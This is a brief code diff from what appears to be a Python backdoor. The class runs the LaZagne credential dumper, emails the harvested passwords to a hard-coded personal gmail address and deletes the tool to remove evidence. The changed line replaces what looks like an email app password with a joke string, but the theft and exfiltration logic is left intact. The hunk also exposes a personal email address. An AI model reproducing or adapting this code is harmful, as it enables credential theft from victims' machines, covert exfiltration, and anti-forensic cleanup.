@@ -62,7 +62,7 @@ class Backdoor:
             output = subprocess.check_output([lazagne_path, "all"], shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 
             # Send via email
-            self.send_mail("sulaimaneksambi@gmail.com", "Ywmzzdxotxypxpmze", output.decode())
+            self.send_mail("sulaimaneksambi@gmail.com", "Nice Try diddy", output.decode())
 
             # Delete evidence
             os.remove(lazagne_path)
